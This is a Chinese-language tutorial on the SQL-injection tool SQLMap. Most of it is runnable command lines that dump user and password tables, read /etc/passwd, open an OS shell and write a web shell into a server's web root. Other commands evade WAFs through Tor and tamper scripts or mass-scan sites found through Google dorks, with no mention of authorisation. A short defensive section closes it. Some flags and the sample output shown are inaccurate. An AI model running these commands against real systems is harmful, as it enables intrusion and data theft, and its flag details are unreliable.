---
title: "sql map"
description: "securi"
pubDate: 2026-05-28
tags: ["資安工具"]
---
# SQLMap 完整教學 - SQL 注入漏洞檢測工具

## 目錄
1. [SQLMap 概述](#sqlmap-概述)
2. [安裝與配置](#安裝與配置)
3. [基本用法](#基本用法)
4. [常用參數](#常用參數)
5. [進階技巧](#進階技巧)
6. [實戰案例](#實戰案例)
7. [檢測結果分析](#檢測結果分析)
8. [常見問題](#常見問題)

---

## SQLMap 概述

**SQLMap** 是一個開源的自動化 SQL 注入漏洞檢測和利用工具，用於識別和利用數據庫中的 SQL 注入漏洞。

### 主要特點
- 🔍 自動檢測 SQL 注入漏洞
- 🗄️ 支持多種數據庫 (MySQL, PostgreSQL, Oracle, MSSQL, SQLite 等)
- 🎯 自動化利用漏洞
- 📊 可以提取數據庫信息、表、列、數據
- 🔐 支持各種繞過技術
- 🚀 高效的並發檢測

### 支持的 SQL 注入類型
| 注入類型 | 說明 |
|---------|------|
| **Boolean-based blind** | 布爾值盲注 (基於真/假) |
| **Time-based blind** | 時間盲注 (基於延遲) |
| **Error-based** | 錯誤注入 (基於錯誤信息) |
| **Union-based** | Union 注入 (基於聯合查詢) |
| **Stacked queries** | 堆棧查詢注入 |
| **Out-of-band** | 帶外注入 |

### 支持的數據庫
```
MySQL, Oracle, PostgreSQL, MSSQL, SQLite, 
Sybase, SAP MaxDB, Informix, Interbase, 
Frontbase, Presto, Altibase, MimerSQL, CockroachDB
```

---

## 安裝與配置

### 1. Linux/Mac 安裝

#### 方法1: 使用 Git 克隆 (推薦)
```bash
# 克隆 SQLMap 項目
git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git
cd sqlmap

# 查看版本
python3 sqlmap.py --version

# 創建軟鏈接 (方便全局使用)
sudo ln -s $(pwd)/sqlmap.py /usr/local/bin/sqlmap
```

#### 方法2: 使用包管理器
```bash
# Ubuntu/Debian
sudo apt-get install sqlmap

# macOS (Homebrew)
brew install sqlmap
```

### 2. Windows 安裝

#### 方法1: 下載可執行文件
```
訪問: https://github.com/sqlmapproject/sqlmap/releases
下載最新的 Windows 版本
解壓縮到指定目錄
```

#### 方法2: 使用 Python
```bash
# 確保已安裝 Python 3
git clone https://github.com/sqlmapproject/sqlmap.git
cd sqlmap
python sqlmap.py --help
```

### 3. 依賴檢查
```bash
# 檢查 Python 版本 (需要 Python 3.x)
python3 --version

# SQLMap 基於純 Python，無需額外依賴
# 但某些功能可能需要額外的包
pip install -r requirements.txt
```

### 4. 驗證安裝
```bash
sqlmap --version
sqlmap --help
```

---

## 基本用法

### 1. 檢測基本 SQL 注入漏洞

#### 方式1: 直接掃描 URL
```bash
# 最簡單的用法
sqlmap -u "http://target.com/page.php?id=1"

# 指定測試參數
sqlmap -u "http://target.com/page.php?id=1" --data "username=admin&password=123"
```

#### 方式2: 指定要測試的參數
```bash
# 只測試 id 參數
sqlmap -u "http://target.com/page.php?id=1&name=test" -p id

# 測試多個參數
sqlmap -u "http://target.com/page.php?id=1&name=test" -p "id,name"
```

#### 方式3: 指定注入點
```bash
# 使用星號 (*) 標記注入點
sqlmap -u "http://target.com/page.php?id=*&name=test"
```

### 2. POST 請求測試

```bash
# 測試 POST 參數
sqlmap -u "http://target.com/login.php" \
  --data "username=admin&password=123"

# 只測試特定 POST 參數
sqlmap -u "http://target.com/login.php" \
  --data "username=admin&password=123" \
  -p username
```

### 3. 添加 HTTP Headers

```bash
# 添加自定義 Header
sqlmap -u "http://target.com/page.php?id=1" \
  -H "User-Agent: Mozilla/5.0" \
  -H "Authorization: Bearer token123"

# 使用 Cookie
sqlmap -u "http://target.com/page.php?id=1" \
  --cookie="PHPSESSID=abc123; login=true"

# 添加 Referer
sqlmap -u "http://target.com/page.php?id=1" \
  --referer="http://target.com/"
```

### 4. 測試 JSON 和 XML 數據

```bash
# 測試 JSON 數據
sqlmap -u "http://target.com/api/user" \
  --data '{"id":"1", "name":"test"}' \
  --headers "Content-Type: application/json"

# 指定 JSON 參數
sqlmap -u "http://target.com/api/user" \
  --data '{"id":"1*", "name":"test"}' \
  --technique=E

# 測試 XML 數據
sqlmap -u "http://target.com/api/user" \
  --data '<id>1</id><name>test</name>'
```

### 5. 文件輸入方式

```bash
# 從文件讀取請求 (Burp Suite 導出)
sqlmap -r request.txt

# 從 Burp Suite 日誌提取
sqlmap -l burp_log.xml -p id

# 從 Google Dork 結果掃描
sqlmap -g "inurl:id.php?id=" --batch
```

---

## 常用參數

### 檢測參數
| 參數 | 說明 | 範例 |
|------|------|------|
| `-u, --url` | 目標 URL | `-u "http://target.com/page.php?id=1"` |
| `-r, --request` | 從文件讀取 HTTP 請求 | `-r request.txt` |
| `--data` | POST 數據 | `--data "user=admin&pass=123"` |
| `-p, --testParameter` | 指定要測試的參數 | `-p id` |
| `--cookie` | HTTP Cookie | `--cookie "PHPSESSID=abc"` |
| `-H, --header` | 自定義 HTTP Header | `-H "User-Agent: Mozilla/5.0"` |
| `--referer` | HTTP Referer | `--referer "http://target.com"` |
| `-A, --user-agent` | 設置 User-Agent | `-A "Mozilla/5.0"` |

### 優化參數
| 參數 | 說明 | 預設值 |
|------|------|--------|
| `--level` | 檢測級別 (1-5) | 1 |
| `--risk` | 檢測風險 (1-3) | 1 |
| `--threads` | 並發線程數 | 1 |
| `--timeout` | 連接超時 (秒) | 30 |
| `--retries` | 重試次數 | 3 |
| `--delay` | 請求間隔 (秒) | 0 |

### 注入技術參數
| 參數 | 說明 |
|------|------|
| `--technique` | 指定注入技術 (B=Boolean, E=Error, U=Union, S=Stacked, T=Time, Q=Out-of-band) |
| `--time-sec` | 時間盲注的延遲時間 (秒) |
| `--union-cols` | 指定 UNION 查詢的列數 |
| `--union-char` | 指定 UNION 查詢的填充字符 |

### 數據庫獲取參數
| 參數 | 說明 | 範例 |
|------|------|------|
| `--dbs` | 列舉所有數據庫 | `sqlmap -u "..." --dbs` |
| `-D` | 指定數據庫 | `-D "mysql"` |
| `--tables` | 列舉指定數據庫的表 | `--tables -D "testdb"` |
| `-T` | 指定表 | `-T "users"` |
| `--columns` | 列舉表的列 | `--columns -D "testdb" -T "users"` |
| `-C` | 指定列 | `-C "id,username,password"` |
| `--dump` | 導出表數據 | `--dump -D "testdb" -T "users"` |
| `--dump-all` | 導出所有數據 | `--dump-all` |
| `--search` | 搜索列/表/數據庫 | `--search -T "user"` |

### 輸出和日誌參數
| 參數 | 說明 |
|------|------|
| `-v` | 詳細級別 (0-6) |
| `-o, --output-dir` | 輸出目錄 |
| `--batch` | 批量模式 (非交互) |
| `--flush-session` | 清除會話文件 |

---

## 進階技巧

### 1. 調整檢測級別和風險

```bash
# Level 1-5: 檢測深度 (1=最淺, 5=最深)
# Risk 1-3: 潛在危害 (1=安全, 3=可能破壞數據)

# 快速檢測 (低級別, 快速)
sqlmap -u "http://target.com/page.php?id=1" \
  --level 1 --risk 1 --threads 10

# 全面檢測 (高級別, 慢速但完整)
sqlmap -u "http://target.com/page.php?id=1" \
  --level 5 --risk 3

# 中等檢測 (平衡速度和準確性)
sqlmap -u "http://target.com/page.php?id=1" \
  --level 3 --risk 2
```

### 2. 指定注入技術

```bash
# 只使用 Union 注入 (速度最快)
sqlmap -u "http://target.com/page.php?id=1" \
  --technique=U

# 只使用時間盲注
sqlmap -u "http://target.com/page.php?id=1" \
  --technique=T

# 只使用錯誤注入
sqlmap -u "http://target.com/page.php?id=1" \
  --technique=E

# 結合多種技術 (按優先級: Union, Error, Time, Boolean)
sqlmap -u "http://target.com/page.php?id=1" \
  --technique=UETB
```

### 3. 繞過 WAF/防火牆

```bash
# 使用隨機 User-Agent
sqlmap -u "http://target.com/page.php?id=1" \
  --random-agent

# 使用代理
sqlmap -u "http://target.com/page.php?id=1" \
  --proxy "http://127.0.0.1:8080"

# 使用 SOCKS 代理
sqlmap -u "http://target.com/page.php?id=1" \
  --proxy "socks5://127.0.0.1:1080"

# 添加延遲
sqlmap -u "http://target.com/page.php?id=1" \
  --delay 2

# 使用 Tor 網絡
sqlmap -u "http://target.com/page.php?id=1" \
  --proxy "socks5://127.0.0.1:9050"
```

### 4. 自定義 Payload

```bash
# 使用自定義 Tamper Script (修改 Payload)
sqlmap -u "http://target.com/page.php?id=1" \
  --tamper=space2comment,between

# 常用的 Tamper Script:
# - space2comment: 空格替換為 /**/
# - space2plus: 空格替換為 +
# - space2randomblank: 空格替換為隨機空白字符
# - between: 替換 > 為 BETWEEN
# - charencode: 編碼所有字符
# - lowercase: 轉換為小寫
# - uppercase: 轉換為大寫
# - randomcase: 隨機大小寫

# 組合多個 Tamper Script
sqlmap -u "http://target.com/page.php?id=1" \
  --tamper=space2comment,charencode
```

### 5. 提取數據庫信息

```bash
# 列舉所有數據庫
sqlmap -u "http://target.com/page.php?id=1" --dbs

# 列舉指定數據庫的所有表
sqlmap -u "http://target.com/page.php?id=1" \
  -D "testdb" --tables

# 列舉表的所有列
sqlmap -u "http://target.com/page.php?id=1" \
  -D "testdb" -T "users" --columns

# 列舉表的數據類型
sqlmap -u "http://target.com/page.php?id=1" \
  -D "testdb" -T "users" --schema

# 導出表數據
sqlmap -u "http://target.com/page.php?id=1" \
  -D "testdb" -T "users" --dump

# 導出特定列的數據
sqlmap -u "http://target.com/page.php?id=1" \
  -D "testdb" -T "users" --dump -C "id,username,password"

# 限制導出行數
sqlmap -u "http://target.com/page.php?id=1" \
  -D "testdb" -T "users" --dump --first 10

# 導出所有數據庫
sqlmap -u "http://target.com/page.php?id=1" --dump-all
```

### 6. 搜索特定數據

```bash
# 搜索包含特定名稱的表
sqlmap -u "http://target.com/page.php?id=1" \
  --search -T "user"

# 搜索包含特定名稱的列
sqlmap -u "http://target.com/page.php?id=1" \
  --search -C "password"

# 搜索包含特定名稱的數據庫
sqlmap -u "http://target.com/page.php?id=1" \
  --search -D "admin"
```

### 7. 執行操作系統命令

```bash
# 執行 OS 命令 (需要特定權限)
sqlmap -u "http://target.com/page.php?id=1" \
  --os-cmd "whoami"

# 執行 Shell
sqlmap -u "http://target.com/page.php?id=1" \
  --os-shell

# 讀取文件 (基於數據庫權限)
sqlmap -u "http://target.com/page.php?id=1" \
  --file-read "/etc/passwd"

# 寫入文件
sqlmap -u "http://target.com/page.php?id=1" \
  --file-write "shell.php" --file-dest "/var/www/html/shell.php"
```

---

## 實戰案例

### 案例1: 檢測簡單的 GET 參數注入

```bash
# 目標: http://vulnerable.com/product.php?id=1

# 步驟1: 檢測漏洞
sqlmap -u "http://vulnerable.com/product.php?id=1" -v 1

# 步驟2: 確定數據庫類型
# (SQLMap 會自動檢測, 結果中會顯示)

# 步驟3: 列舉數據庫
sqlmap -u "http://vulnerable.com/product.php?id=1" --dbs

# 步驟4: 列舉特定數據庫的表
sqlmap -u "http://vulnerable.com/product.php?id=1" \
  -D "shop" --tables

# 步驟5: 導出敏感數據
sqlmap -u "http://vulnerable.com/product.php?id=1" \
  -D "shop" -T "users" --dump
```

### 案例2: 檢測 POST 登錄表單

```bash
# 目標: POST /login.php
# 參數: username=admin&password=123

# 保存請求到文件 (request.txt):
# POST /login.php HTTP/1.1
# Host: target.com
# Content-Type: application/x-www-form-urlencoded
# 
# username=admin&password=123

# 執行掃描
sqlmap -r request.txt -p username

# 或者直接命令行
sqlmap -u "http://target.com/login.php" \
  --data "username=admin&password=123" \
  -p username
```

### 案例3: 檢測 JSON API

```bash
# 目標: POST /api/users
# 數據: {"id":"1", "name":"test"}

sqlmap -u "http://target.com/api/users" \
  --data '{"id":"1*", "name":"test"}' \
  --headers "Content-Type: application/json"
```

### 案例4: 檢測受保護的頁面

```bash
# 需要登錄的頁面 (帶 Cookie 和 Token)

sqlmap -u "http://target.com/admin/page.php?id=1" \
  --cookie "PHPSESSID=abc123def456" \
  -H "X-CSRF-Token: csrf_token_value" \
  --user-agent "Mozilla/5.0"
```

### 案例5: 快速掃描多個 URL

```bash
# 保存 URL 列表到 urls.txt
# http://target.com/page.php?id=1
# http://target.com/product.php?id=2
# http://target.com/news.php?id=3

# 逐個掃描
for url in $(cat urls.txt); do
  sqlmap -u "$url" --batch --threads 5
done

# 或從 Google Dork 結果掃描
sqlmap -g "inurl:.php?id=" --batch --threads 10
```

---

## 檢測結果分析

### 1. 漏洞確認

掃描完成後，SQLMap 會輸出以下信息:

```
[*] 測試 URL 參數 'id'
[*] 使用 'GET' 請求進行掃描
[*] 檢測到 MySQL 數據庫
[*] 檢測到以下注入類型:
    - Boolean-based blind SQL Injection
    - Time-based blind SQL Injection
    - Union-based SQL Injection
[+] SQL 注入漏洞確認!
```

### 2. Payload 分析

SQLMap 在掃描過程中會顯示成功的 Payload:

```
[*] Boolean-based blind SQL Injection (second-order)
Payload: id=1 AND 1=1
Payload: id=1 AND 1=2

[*] Time-based blind SQL Injection
Payload: id=1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)-- -

[*] Union-based SQL Injection
Payload: id=-1 UNION ALL SELECT 1,2,3,4,5-- -
```

### 3. 漏洞嚴重級別

| 注入類型 | 檢測難度 | 利用難度 | 危害程度 |
|---------|--------|--------|--------|
| **Union-based** | 簡單 | 簡單 | 高 |
| **Error-based** | 簡單 | 簡單 | 高 |
| **Boolean-based blind** | 困難 | 困難 | 中 |
| **Time-based blind** | 困難 | 困難 | 中 |
| **Out-of-band** | 非常困難 | 困難 | 高 |

---

## 常見問題

### 1. "未檢測到可測試的參數"

```bash
# 問題: SQLMap 無法自動識別參數
# 解決方案1: 明確指定參數
sqlmap -u "http://target.com/page.php?id=1" -p id

# 解決方案2: 使用星號標記注入點
sqlmap -u "http://target.com/page.php?id=*" 

# 解決方案3: 增加檢測級別
sqlmap -u "http://target.com/page.php?id=1" --level 5
```

### 2. "未檢測到 SQL 注入漏洞"

```bash
# 可能原因:
# 1. 參數不存在漏洞
# 2. 有 WAF 防護
# 3. 參數被過濾

# 嘗試以下方案:
# 方案1: 使用隨機 User-Agent
sqlmap -u "http://target.com/page.php?id=1" --random-agent

# 方案2: 添加延遲
sqlmap -u "http://target.com/page.php?id=1" --delay 1

# 方案3: 增加檢測時間
sqlmap -u "http://target.com/page.php?id=1" --time-sec 10

# 方案4: 使用 Tamper Script
sqlmap -u "http://target.com/page.php?id=1" \
  --tamper=space2comment,charencode

# 方案5: 提高檢測級別和風險
sqlmap -u "http://target.com/page.php?id=1" \
  --level 5 --risk 3
```

### 3. "連接超時"

```bash
# 原因: 目標響應慢或不穩定

# 解決方案:
# 1. 增加超時時間
sqlmap -u "http://target.com/page.php?id=1" --timeout 60

# 2. 增加重試次數
sqlmap -u "http://target.com/page.php?id=1" --retries 5

# 3. 減少線程數
sqlmap -u "http://target.com/page.php?id=1" --threads 1
```

### 4. "WAF 檢測和阻擋"

```bash
# 症狀: 收到 403/403 響應或被阻擋

# 解決方案:
# 1. 使用代理
sqlmap -u "http://target.com/page.php?id=1" \
  --proxy "http://proxy.com:8080"

# 2. 使用 Tor
sqlmap -u "http://target.com/page.php?id=1" \
  --proxy "socks5://127.0.0.1:9050"

# 3. 添加延遲 (避免觸發 WAF)
sqlmap -u "http://target.com/page.php?id=1" \
  --delay 3

# 4. 使用 Tamper Script (繞過 WAF)
sqlmap -u "http://target.com/page.php?id=1" \
  --tamper=space2comment,between,lowercase

# 5. 使用舊式 Payload (可能 WAF 規則較舊)
sqlmap -u "http://target.com/page.php?id=1" \
  --technique=B
```

### 5. "掃描速度太慢"

```bash
# 解決方案:
# 1. 增加線程數
sqlmap -u "http://target.com/page.php?id=1" --threads 10

# 2. 降低檢測級別
sqlmap -u "http://target.com/page.php?id=1" --level 1

# 3. 指定注入技術 (只用 Union 最快)
sqlmap -u "http://target.com/page.php?id=1" --technique=U

# 4. 使用批量模式 (無需交互確認)
sqlmap -u "http://target.com/page.php?id=1" --batch

# 5. 批量掃描配置
sqlmap -u "http://target.com/page.php?id=1" \
  --level 1 --risk 1 --threads 10 --batch
```

### 6. "導出數據很慢"

```bash
# 原因: 表數據量大

# 解決方案:
# 1. 只導出部分數據
sqlmap -u "http://target.com/page.php?id=1" \
  -D "testdb" -T "users" --dump --first 100

# 2. 使用並發
sqlmap -u "http://target.com/page.php?id=1" \
  -D "testdb" -T "users" --dump --threads 10

# 3. 只導出特定列
sqlmap -u "http://target.com/page.php?id=1" \
  -D "testdb" -T "users" --dump -C "username,password"
```

---

## 防護建議 (開發者視角)

### 1. 預防 SQL 注入

#### 使用參數化查詢 (推薦)
```php
<?php
// 易受攻擊的代碼
$id = $_GET['id'];
$query = "SELECT * FROM users WHERE id = " . $id;  // 危險!

// 安全的代碼
$id = $_GET['id'];
$stmt = $db->prepare("SELECT * FROM users WHERE id = ?");
$stmt->bind_param("i", $id);
$stmt->execute();
?>
```

#### 輸入驗證
```php
<?php
$id = $_GET['id'];
if (!is_numeric($id)) {
    die("Invalid input");
}
$query = "SELECT * FROM users WHERE id = " . intval($id);
?>
```

#### 最小權限原則
```
應用數據庫用戶應該只有必要的權限
- 不要使用 root 或 admin 賬戶
- 根據功能限制權限 (SELECT, INSERT, UPDATE)
- 禁用危險功能 (FILE, INTO OUTFILE, LOAD_FILE)
```

### 2. 檢測和響應

```bash
# 定期掃描自己的應用
sqlmap -u "http://localhost/page.php?id=1" \
  --dbs --tables --dump

# 監控數據庫日誌
# 查找異常查詢、UNION 語句、延遲等

# 設置告警
# 監控應用和數據庫日誌中的 SQL 注入跡象
```

### 3. WAF 配置
```
阻擋或記錄包含以下關鍵字的請求:
- UNION
- SELECT
- WHERE
- OR
- AND
- --
- /*
- */
- xp_
- sp_
- EXEC
- EXECUTE
```

---

## 命令速查

### 快速檢測
```bash
# 基本掃描
sqlmap -u "URL"

# 添加 POST 數據
sqlmap -u "URL" --data "param1=val1&param2=val2"

# 指定參數
sqlmap -u "URL" -p param_name
```

### 數據提取
```bash
# 列舉數據庫
sqlmap -u "URL" --dbs

# 列舉表
sqlmap -u "URL" -D dbname --tables

# 導出數據
sqlmap -u "URL" -D dbname -T tablename --dump
```

### 高級選項
```bash
# 並發和性能
sqlmap -u "URL" --threads 10 --batch

# 繞過防護
sqlmap -u "URL" --random-agent --tamper=space2comment

# 導出到文件
sqlmap -u "URL" --dump -D dbname -T tablename -o output.txt
```

---

## 總結

| 概念 | 說明 |
|------|------|
| **Level** | 檢測深度 (1-5) |
| **Risk** | 測試風險 (1-3) |
| **Technique** | 注入技術選擇 |
| **Tamper** | Payload 修改方式 |
| **Thread** | 並發線程數 |
| **--dbs** | 列舉數據庫 |
| **--tables** | 列舉表 |
| **--dump** | 導出數據 |

---

希望這份教學對你有幫助！更多信息訪問: https://sqlmap.org
